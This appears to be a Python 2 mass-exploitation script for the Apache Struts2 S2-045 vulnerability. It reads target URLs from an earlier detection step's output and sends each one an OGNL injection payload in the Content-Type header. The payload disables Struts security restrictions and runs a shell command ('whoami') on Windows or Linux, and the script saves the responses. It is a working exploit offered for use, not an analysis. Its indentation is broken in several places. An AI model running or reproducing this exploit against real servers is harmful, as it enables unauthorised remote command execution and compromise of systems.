# -*- coding: utf-8 -*-

import urllib2
import sys
from poster.encode import multipart_encode
from poster.streaminghttp import register_openers

def exploit():
    urls = open('../S2045Detection/detectresult', 'r')
    exploitresults = open('./exploitresult', 'w')
for url in urls.readlines():
        url = url.strip('\n')
        register_openers()
        datagen, header = multipart_encode({"image1": url})
        header["User-Agent"]="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
        header["Content-Type"]="%{(#nikenb='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='"+'whoami'+"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
        request = urllib2.Request(url,datagen,headers=header)
try:
            response = urllib2.urlopen(request, timeout=10)
            result = response.read(204800)
except Exception, e:
print 'exception:'+url
else:
if len(result) > 100:
print 'html:'+url
else:
print result.strip('\n')+':'+ url
                exploitresults.write(result)
    urls.close()
    exploitresults.close()

if __name__ == "__main__":
    exploit()